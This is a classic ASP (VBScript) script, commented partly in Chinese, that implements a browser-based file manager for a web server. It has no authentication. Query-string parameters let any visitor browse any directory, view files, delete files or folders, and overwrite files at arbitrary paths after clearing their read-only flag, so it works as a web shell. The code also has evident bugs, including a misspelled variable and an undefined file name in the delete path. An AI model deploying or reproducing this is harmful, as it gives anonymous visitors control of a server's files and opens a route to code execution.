<%
On Error Resume Next

function bianliFolder(currentPath)

        path = server.mapPath(currentPath)
	response.write("v1.1Current Folder is <b>" & path & "</b><br>")
		
	set fso=server.CreateObject("scripting.filesystemobject")    

        on error resume next

        set objFolder=fso.GetFolder(path)
	upperFolder = LEFT(currentPath,(InStrRev(currentPath,"/")-1))
	IF currentPath <> "/" THEN
		if upperFolder="" then upperFolder="/"
		response.write("<tr><td>·<a href='?rootPath=" & upperFolder & "'> 返回上级目录 ")
		response.write(upperFolder)
		response.write("</a></td><td></td><td></td></tr>")
	END IF

	if Right(currentPath,1)<>"/" then currentPath=currentPath&"/"

        set objSubFolders=objFolder.Subfolders
        for each objSubFolder in objSubFolders 
            'nowpath=path + "\" + objSubFolder.name
            nowpath=objSubFolder.name
            nextPath = currentPath & objSubFolder.name
            'Response.Write nowpath
            'Response.Write "·<a href='del.asp?fileType=multi&filePath=" & nowpath & "'>" & nowpath & "</a>"
            Response.Write "<tr><td>·<a href='?rootPath=" & nextPath & "'>" & nowpath & "</a>"
            Response.Write "</td><td>"&objSubFolder.datelastmodified&"</td><td>&nbsp;</td><td>&nbsp;</td></tr>"
            'bianli(nowpath)'递归
        next 
        Call bianliFile(currentPath)
        set objFolder=nothing
        set objSubFolders=nothing
        set fso=nothing
    end function
%>
<%
function bianliFile(currentPath)
	'go through files
        path = server.mapPath(currentPath)
		
        'Response.Write("path is " & path & "<br>")
        
        set fso=server.CreateObject("scripting.filesystemobject")    

        on error resume next

        set objFolder=fso.GetFolder(path)

            nowpath = path
            'Response.Write("now path is " & nowpath & "<br>")
            'Response.Write "<a href='del.asp?fileType=multi&filePath=" & nowpath & "'>" & nowpath & "</a>"

            set objFiles=objFolder.Files
            for each objFile in objFiles
                Response.Write "<tr><td>·"
                Response.Write objFile.name & "</td><td>" & objFile.datelastmodified& "</td>"
                Response.Write "<td><a href='?action=display&fileType=gb2312&filePath=" & nowpath & "\" & objFile.name & "'>GB2312 Edit</a>&nbsp;&nbsp;<a href='?action=display&fileType=utf-8&filePath=" & nowpath & "\" & objFile.name & "'>UTF-8 Edit</a></td><td><a href='?action=del&fileType=single&filePath=" & nowpath & "\" & objFile.name & "'>Del</a></td></tr>"
            next
            Response.Write "<p>"
            'bianli(nowpath)'递归
         set objFolder=nothing
        set objSubFolders=nothing
        set fso=nothing
    end function
%>
<%
function delit(fileType,path)
	'remove a file
        set fso=server.CreateObject("scripting.filesystemobject")    

        IF UCase(fileType) = "SINGLE" THEN
        	fso.DeleteFile(path)

        END IF
        IF UCase(fileType) = "MULTI" THEN
        	fso.DeleteFolder(path)

        END IF

    end function
%>
<%
function displayit(fileType,path)

response.write Server.HTMLEncode(LoadFile(path,fileType))

end function


function readItAll(path)
	'read a file
	Set objTStream = objFSO.OpenTextFile(path)
	Do While Not objTStream.AtEndOfStream
	   'get the line number
	   intLineNum = objTStream.Line
	   'format and convert to a string
	   strLineNum = Right("00" & CStr(intLineNum), 3)
	   'get the text of the line from the file
	   strLineText = objTStream.ReadLine
	   Response.Write strLineNum & ": " & strLineText & vbCrLf
	Loop
	objTStream.Close

end function

Function writeTextFile(fileName,fileToWrite,fileType)
	SaveToFile fileToWrite,fileName,fileType
End Function

Function LoadFile(ByVal File,ByVal charset)
Dim objStream
Set objStream = Server.CreateObject("ADODB.Stream")
If Err.Number=-2147221005 Then 
Response.Write "<div align='center'>非常遗憾,您的主机不支持ADODB.Stream,不能使用本程序</div>"
Err.Clear
Response.End
End If
With objStream
.Type = 2
.Mode = 3
.Open
.LoadFromFile File
If Err.Number<>0 Then
Response.Write "<div align='center'>文件<font>"&File&"</font>无法被打开，请检查是否存在!</font></div>"
Err.Clear
Response.End
End If
.Charset = charset
.Position = 2
LoadFile = .ReadText
.Close
End With
Set objStream = Nothing 
End Function

'存储内容到文件
Sub SaveToFile(ByVal strBody,ByVal File,ByVal charset)
Dim objStream
On Error Resume Next
if left(strBody,8)="&#65279;" then
strBody=Mid(strBody,9)
end if 
Set objStream = Server.CreateObject("ADODB.Stream")
If Err.Number=-2147221005 Then 
Response.Write "<div align='center'>非常遗憾,您的主机不支持ADODB.Stream,不能使用本程序</div>"
Err.Clear
Response.End
End If
With objStream
.Type = 2
.Mode = 3
.Open
.Charset = charset
.Position = objStream.Size
.WriteText = strBody
.SaveToFile File,2
.Close
End With
Set objStream = Nothing
End Sub 
%>

<%

action = request.queryString("action")

IF action = "del" THEN

	fileType = request.queryString("fileType")
	filePath = request.queryString("filePath")
	
	response.write(filePath)
	Set MyFileObject=Server.CreateObject("Scripting.FileSystemObject")
Set Myfile=MyFileObject.GetFile(fileName)
Myfile.attributes=0
	Call delit(fileType,filePath)
	
	'response.redirect("")
	
	if  err  then  
	     Response.Write  "错误："&Err.Description  
	     response.end
	else  
	     Response.Write  "成功！"  
	     response.end
	end  if  

END IF

IF action = "save" THEN

	Dim db,fileToWriteType,fileContent,fileName
	fileType = Request("fileType")
	fileAddress = Request("fileAddress")
	fileAddressNew = Request("fileAddressNew")
	fileContent = Request("fileContent")
	
	IF fileAddresNew = "" THEN
		fileName = fileAddress
	ELSE
		fileName = fileAddressNew
	END IF
	Set MyFileObject=Server.CreateObject("Scripting.FileSystemObject")
Set Myfile=MyFileObject.GetFile(fileName)
Myfile.attributes=0
	Call writeTextFile(fileName,fileContent,fileType)

	'Call funAlertMsg("操作成功！")

	if  err  then  
	

	
	     Response.Write  fileName&"<br>错误s："&Err.Description  
	     response.end
	else  
		Set MyFileObject=Server.CreateObject("Scripting.FileSystemObject")
Set Myfile=MyFileObject.GetFile(fileName)
Myfile.attributes=1
	     Response.Write  "<br>成功！"  
	     response.end
	end  if  
	

END IF
%>
<%
IF action = "display" THEN
filePath = request.queryString("filePath")
fileType = request.queryString("fileType")
%>
<body>
<form action="?action=save&fileType=<%=fileType%>" method="post">
<br>
<input type="text" name="fileAddress" value="<%=filePath%>" size="72"><br>
<textarea name="fileContent" cols=70 rows=30><%
Call displayit(fileType,filePath)%></textarea><br>
<input type="submit" name="SAVE" value="SAVE">
</form><br>
<%
response.write(filePath)
%>
<%

if  err  then  
     Response.Write  "<br>状态:错误："&Err.Description  
     response.end
else  
     Response.Write  "<br>状态:成功！"  
     response.end
end  if  

%>
</body>

<%
END IF
%>
<table border=1 width=700>
<%
rootPath = request.queryString("rootPath")
'if not set the rootPath parameter then set it to current path
if rootPath = "" then rootPath = "/"
Call bianliFolder(rootPath)
%>
</table>